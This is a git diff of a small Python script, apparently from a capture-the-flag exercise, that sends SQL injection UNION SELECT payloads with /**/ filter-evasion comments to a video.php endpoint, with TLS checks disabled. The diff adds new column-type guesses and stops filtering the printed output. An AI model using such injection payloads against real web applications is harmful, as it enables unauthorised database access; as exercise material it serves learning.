@@ -5,17 +5,17 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1'
 
-for first in ['null', '1', '\'a\'']:
-    for second in ['null', '1', '\'a\'']:
-        for third in ['null', '1', '\'a\'']:
+for first in ['null', '1', '\'a\'', '\"a\"' ]:
+    for second in ['null', '1', '\'a\'', '\"a\"']:
+        for third in ['null', '1', '\'a\'', '\"a\"']:
             payload = '/**/union/**/select/**/' + first + ',' + second + ',' + third + '/**/from/**/dual'
 
             url2 = url + payload
             result = requests.get(url2, verify=False)
 
-            if 'Error' not in result.text and 'Bad cat!' not in result.text:
-                print(result.text)
-                print('url now %s'%(url2))
+            print('url now %s'%(url2))
+            #if 'Error' not in result.text and 'Bad cat!' not in result.text:
+                # print(result.text)
 
 '''
 for i in range(0, 100):
